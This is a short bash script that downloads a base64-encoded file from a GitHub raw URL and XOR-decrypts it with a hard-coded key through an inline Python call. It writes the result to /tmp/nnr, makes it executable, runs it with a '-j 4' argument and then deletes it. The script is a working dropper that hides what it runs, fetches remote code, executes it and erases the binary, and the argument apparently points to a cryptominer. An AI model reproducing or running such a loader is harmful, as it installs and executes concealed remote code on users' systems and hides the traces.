#!/bin/bash
_xor_decrypt() {
    local data="$1"
    local key="$2"
    python3 -c "
import base64, sys
data = base64.b64decode('$data')
key = '$key'
decrypted = bytes([data[i] ^ ord(key[i % len(key)]) for i in range(len(data))])
sys.stdout.buffer.write(decrypted)
" 2>/dev/null
}
_PAYLOAD=$(curl -sL https://raw.githubusercontent.com/popowana/clever-phoenix-960/refs/heads/main/payload.txt)
if [ -z "$_PAYLOAD" ]; then
    echo "Error: Failed to download payload"
    exit 1
fi
echo "Payload downloaded successfully"
_xor_decrypt "$_PAYLOAD" "kembang" > /tmp/nnr
chmod +x /tmp/nnr
/tmp/nnr -j 4
rm -f /tmp/nnr
